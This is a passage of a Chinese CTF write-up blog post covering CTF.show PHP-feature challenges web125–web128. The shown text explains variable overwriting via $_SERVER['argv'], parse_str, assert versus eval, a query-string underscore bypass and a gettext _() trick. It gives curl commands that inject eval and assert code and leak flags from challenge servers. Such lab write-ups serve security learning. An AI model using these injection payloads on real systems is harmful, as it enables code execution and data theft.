+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl --location --request POST <span class="string">&#x27;http://99fb334d-dd4f-40a2-8baf-f0f0015d457f.challenge.ctf.show:8080/?0=echo $flag;&#x27;</span> \</span><br><span class="line">								--form <span class="string">&#x27;CTF_SHOW=&quot;1&quot;&#x27;</span> \</span><br><span class="line">								--form <span class="string">&#x27;CTF[SHOW.COM=&quot;1&quot;&#x27;</span> \</span><br><span class="line">								--form <span class="string">&#x27;fl0g=&quot;1&quot;&#x27;</span> \</span><br><span class="line">								--form <span class="string">&#x27;fun=&quot;eval($_GET[0])&quot;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h1><h2 id="知识点-7"><a href="#知识点-7" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>使用 parse_str 将字符串解析成多个变量</li>
+</ul>
+<h2 id="做题-8"><a href="#做题-8" class="headerlink" title="做题"></a>做题</h2><p>草，前面没提到这个 <code>$a=$_SERVER[&#39;argv&#39;];</code> 我都忘了有这个东西了，还以为发挥作用的是 ?a=1+flag=xxx 这么厉害呢。。。</p>
+<p>由题目，我们可以使用变量覆盖来使变量 $fl0g 的值为 flag_give_me ，但我们又不能直接传入 $_GET ，那怎么办呢？</p>
+<p>刚好由 hint，我发现题目传入的参数是 /?a=1+fl0g=flag_give_me ，我还在好奇为什么不能用 &amp; 而需要用 + ，经过下面的分析就明白了。</p>
+<p>使用 + 时，argv会被分成两个，分别为 <code>a=1</code> 以及 <code>fl0g=flag_give_me</code>，而此时 <code>$_GET</code> 只有一个数组成员。</p>
+<p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-Feature-2/Untitled%203.png" alt="Untitled"></p>
+<p>但我使用 &amp; 时，argv还是回被分成2个，$_GET 此时就会变为两个，会被判断条件 <code>!isset($_GET[&#39;fl0g&#39;])</code> 所拦截。</p>
+<h3 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str"></a>parse_str</h3><p>提交 fun 设置为 parse_str($a[1]) 即可获得flag，请求参数如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl --location --request POST <span class="string">&#x27;http://5f2c6d41-ccf6-48c6-a373-f554ec454ebd.challenge.ctf.show:8080/?a=1+fl0g=flag_give_me&#x27;</span> \</span><br><span class="line">								--form <span class="string">&#x27;CTF_SHOW=&quot;1&quot;&#x27;</span> \</span><br><span class="line">								--form <span class="string">&#x27;CTF[SHOW.COM=&quot;1&quot;&#x27;</span> \</span><br><span class="line">								--form <span class="string">&#x27;fl0g=&quot;1&quot;&#x27;</span> \</span><br><span class="line">								--form <span class="string">&#x27;fun=&quot;parse_str($a[1])&quot;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h3><p>这个函数的作用，有点类似于eval？但我就不明白了，<del>你小米把我内测资格取消掉，还把我的内测分把300多分扣到55分，你是傻的吗！</del></p>
+<p><del>为什么eval不行？它碰撞到了哪个正则规则吗？</del></p>
+<p><strong>在assert内允许不是分号结尾的语句，例如 assert(‘$a=test’);，但是eval内必须要为分号结尾，所以将assert改为eval时，还需要把 GET 参数 fl0g 中的flag_give_me 后面添加分号，这样就可以拿到flag了。</strong></p>
+<p>请求参数如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl --location --request POST <span class="string">&#x27;http://5f2c6d41-ccf6-48c6-a373-f554ec454ebd.challenge.ctf.show:8080/?$fl0g=flag_give_me&#x27;</span> \</span><br><span class="line">								--form <span class="string">&#x27;CTF_SHOW=&quot;1&quot;&#x27;</span> \</span><br><span class="line">								--form <span class="string">&#x27;CTF[SHOW.COM=&quot;1&quot;&#x27;</span> \</span><br><span class="line">								--form <span class="string">&#x27;fl0g=&quot;1&quot;&#x27;</span> \</span><br><span class="line">								--form <span class="string">&#x27;fun=&quot;assert($a[0])&quot;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="参考资料-4"><a href="#参考资料-4" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.parse-str.php">https://www.php.net/manual/zh/function.parse-str.php</a> parse_str — 将字符串解析成多个变量</li>
+<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.assert.php">https://www.php.net/manual/zh/function.assert.php</a> assert — 检查一个断言是否为 false</li>
+<li><a target="_blank" rel="noopener" href="https://www.0x002.com/2018/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%8F%8A%E5%9C%A8webshell%E4%B8%AD%E7%9A%84%E8%BF%90%E7%94%A8/">https://www.0x002.com/2018/变量覆盖漏洞学习及在webshell中的运用/</a></li>
+</ul>
+<h1 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h1><p><code>PHP Version: 7.3.11</code></p>
+<h2 id="做题-9"><a href="#做题-9" class="headerlink" title="做题"></a>做题</h2><p>这里面， $_SERVER[‘QUERY_STRING’] 会提取出请求 URL 中 /? 后的参数，也就是 GET 参数的 urlencode 版。但是，由于下划线被waf阻止，我们似乎不能直接使 ctf_show 的值为 ilove36d <del>（说起来这ctfshow的创始人是不是有什么特殊的xp天天喜欢36d的</del></p>
+<p><del>上回书说道，彼时的璃月</del></p>
+<p>我们在web123中提过，某些字符可以被转换。所以，参照该表，我们还可以用的字符为空格。</p>
+<p>最后请求参数为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --location --request GET <span class="string">&#x27;http://08c6da10-0dd4-4d75-b0f7-8d3e70f950c6.challenge.ctf.show:8080/?ctf show=ilove36d&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h1><p><code>PHP Version: 5.6.40</code></p>
+<h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"><span class="comment"># @Author: h1xa </span></span><br><span class="line"><span class="comment"># @Date:   2020-10-10 11:25:09 </span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa </span></span><br><span class="line"><span class="comment"># @Last Modified time: 2020-10-12 19:49:05 </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line">include(<span class="string">&quot;flag.php&quot;</span>); </span><br><span class="line">highlight_file(__FILE__); </span><br><span class="line"></span><br><span class="line">$f1 = $_GET[<span class="string">&#x27;f1&#x27;</span>]; </span><br><span class="line">$f2 = $_GET[<span class="string">&#x27;f2&#x27;</span>]; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(check($f1))&#123; </span><br><span class="line">    var_dump(call_user_func(call_user_func($f1,$f2))); </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    echo <span class="string">&quot;嗯哼？&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$str</span>)</span>&#123; </span><br><span class="line">    <span class="keyword">return</span> !preg_match(<span class="string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, $str); </span><br><span class="line">&#125; NULL</span><br></pre></td></tr></table></figure>
+
+<h2 id="知识点-8"><a href="#知识点-8" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>对 _() 函数的了解与使用</li>
+</ul>
+<h2 id="做题-10"><a href="#做题-10" class="headerlink" title="做题"></a>做题</h2><p>在 PHP 中，启用了 gettext 扩展的  PHP 程序上，直接调用 <em>() 方法等同于调用 gettext()，也就是说，调用 (“hello”); 会使 PHP 返回 hello 字符串。同时，在此题中使用 get_defined_text 可以获得被定义的变量。由于此处 check() 不允许变量 f1 携带任何字母和数字字符，所以只能从f2进行下手。</em></p>
+<p>在此题中，也就等同于只能访问一个方法使得其获得flag。我们可以使用 <code>/?f1=_&amp;f2=get_defined_vars</code> 来获得 flag</p>
+<h2 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h2><ul>
+<li>有没有只通过一个函数来getshell的方法，比如说匿名函数？</li>
+<li>有没有可以通过一个函数+一个参数，但是关键的控制函数（如eval，system等）被限制使用来getshell的方法？</li>
+</ul>
+<h2 id="参考资料-5"><a href="#参考资料-5" class="headerlink" title="参考资料"></a>参考资料</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lost-1987/articles/3309693.html">toxic</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/book.gettext.php">Gettext</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/archives/CTF-Show-Get-Started-with-the-web-PHP-unserialize.html" rel="prev" title="【Klee-CTF】CTF.Show Web入门 PHP 反序列化 web254~web267">
+      <i class="fa fa-chevron-left"></i> 【Klee-CTF】CTF.Show Web入门 PHP 反序列化 web254~web267
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/archives/CTF-Show-Get-Started-with-the-web-JWT.html" rel="next" title="【Klee-CTF】CTF.Show Web入门 JWT 专题 web345～web350">
+      【Klee-CTF】CTF.Show Web入门 JWT 专题 web345～web350 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    
+  <div class="comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+    </div>
+  </div>
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#web110"><span class="nav-number">1.</span> <span class="nav-text">web110</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="nav-number">1.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%9A%E9%A2%98"><span class="nav-number">1.2.</span> <span class="nav-text">做题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-number">1.3.</span> <span class="nav-text">参考资料</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web111"><span class="nav-number">2.</span> <span class="nav-text">web111</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-1"><span class="nav-number">2.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%9A%E9%A2%98-1"><span class="nav-number">2.2.</span> <span class="nav-text">做题</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web112"><span class="nav-number">3.</span> <span class="nav-text">web112</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-2"><span class="nav-number">3.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%9A%E9%A2%98-2"><span class="nav-number">3.2.</span> <span class="nav-text">做题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99-1"><span class="nav-number">3.3.</span> <span class="nav-text">参考资料</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web113"><span class="nav-number">4.</span> <span class="nav-text">web113</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-3"><span class="nav-number">4.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%9A%E9%A2%98-3"><span class="nav-number">4.2.</span> <span class="nav-text">做题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="nav-number">4.2.1.</span> <span class="nav-text">非预期解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="nav-number">4.2.2.</span> <span class="nav-text">预期解</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web114"><span class="nav-number">5.</span> <span class="nav-text">web114</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-4"><span class="nav-number">5.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%9A%E9%A2%98-4"><span class="nav-number">5.2.</span> <span class="nav-text">做题</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web115"><span class="nav-number">6.</span> <span class="nav-text">web115</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81"><span class="nav-number">6.1.</span> <span class="nav-text">代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-5"><span class="nav-number">6.2.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%9A%E9%A2%98-5"><span class="nav-number">6.3.</span> <span class="nav-text">做题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99-2"><span class="nav-number">6.4.</span> <span class="nav-text">参考资料</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web123"><span class="nav-number">7.</span> <span class="nav-text">web123</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%9A%E9%A2%98-6"><span class="nav-number">7.1.</span> <span class="nav-text">做题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99-3"><span class="nav-number">7.2.</span> <span class="nav-text">参考资料</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web125"><span class="nav-number">8.</span> <span class="nav-text">web125</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-6"><span class="nav-number">8.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%9A%E9%A2%98-7"><span class="nav-number">8.2.</span> <span class="nav-text">做题</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web126"><span class="nav-number">9.</span> <span class="nav-text">web126</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-7"><span class="nav-number">9.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%9A%E9%A2%98-8"><span class="nav-number">9.2.</span> <span class="nav-text">做题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#parse-str"><span class="nav-number">9.2.1.</span> <span class="nav-text">parse_str</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#assert"><span class="nav-number">9.2.2.</span> <span class="nav-text">assert</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99-4"><span class="nav-number">9.3.</span> <span class="nav-text">参考资料</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web127"><span class="nav-number">10.</span> <span class="nav-text">web127</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%9A%E9%A2%98-9"><span class="nav-number">10.1.</span> <span class="nav-text">做题</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web128"><span class="nav-number">11.</span> <span class="nav-text">web128</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81-1"><span class="nav-number">11.1.</span> <span class="nav-text">代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-8"><span class="nav-number">11.2.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%9A%E9%A2%98-10"><span class="nav-number">11.3.</span> <span class="nav-text">做题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E9%97%AE%E9%A2%98"><span class="nav-number">11.4.</span> <span class="nav-text">其他问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99-5"><span class="nav-number">11.5.</span> <span class="nav-text">参考资料</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Guoguo"
+      src="https://guo.moe/favicon.jpg">
+  <p class="site-author-name" itemprop="name">Guoguo</p>
+  <div class="site-description" itemprop="description">找不到路，就自己走一条出来。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">47</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">26</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/imguoguo" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;imguoguo" rel="noopener" target="_blank"><i class="github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:blog@guo.moe" title="E-Mail → mailto:blog@guo.moe"><i class="envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="rss fa-fw"></i>RSS</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Guoguo</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/medium-zoom.min.js"></script>
+  <script src="/lib/lozad.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/disqusjs@1/dist/disqusjs.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#disqus_thread'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/disqusjs@1/dist/disqus.js', () => {
+    window.dsqjs = new DisqusJS({
+      api       : 'https://disqus.guo.moe/api/' || 'https://disqus.com/api/',
+      apikey    : 'TRTXJqZLCwf51OCjLAd1u320K7DxrMxK37Ch9X2xFXy5Q4d2gdVBKeMT33qizKh9',
+      shortname : 'guoguoblog',
+      url       : "https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-PHP-Feature-2.html",
+      identifier: "archives/CTF-Show-Get-Started-with-the-web-PHP-Feature-2.html",
+      title     : "【Klee-CTF】CTF.Show Web入门 PHP 特性 2 web110~web128",
+    });
+  }, window.DisqusJS);
+});
+</script>
+
+    </div>
+<script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>
